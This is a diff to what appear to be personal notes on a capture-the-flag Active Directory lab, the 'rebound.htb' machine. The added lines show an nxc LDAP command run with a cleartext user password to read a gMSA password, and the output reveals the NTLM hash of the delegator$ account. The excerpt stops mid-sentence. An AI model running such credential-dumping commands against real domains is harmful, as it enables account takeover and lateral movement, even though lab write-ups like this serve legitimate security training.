@@ -419,4 +419,16 @@ SMB         10.129.14.17    445    DC01             [+] rebound.htb\tbrady:543BO
 This user is now compromised
 
 ![[Pasted image 20260404164158.png]]
-I have some enrollee rights but there is no 
+I have some enrollee rights but there is no existing ADCS vulnerabilities here
+
+But i do have `ReadGMSAPassword`
+
+# Compromising `delegator$`
+```python
+nxc ldap dc01.rebound.htb -u 'tbrady' -p '543BOMBOMBUNmanda' --gmsa
+LDAP        10.129.14.17    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb) (signing:Enforced) (channel binding:Always)
+LDAP        10.129.14.17    389    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda 
+LDAP        10.129.14.17    389    DC01             [*] Getting GMSA Passwords
+LDAP        10.129.14.17    389    DC01             Account: delegator$           NTLM: aafb74ba2eb5e5ff7003a9a54ad1f904     PrincipalsAllowedToReadPassword: tbrady
+```
+I 
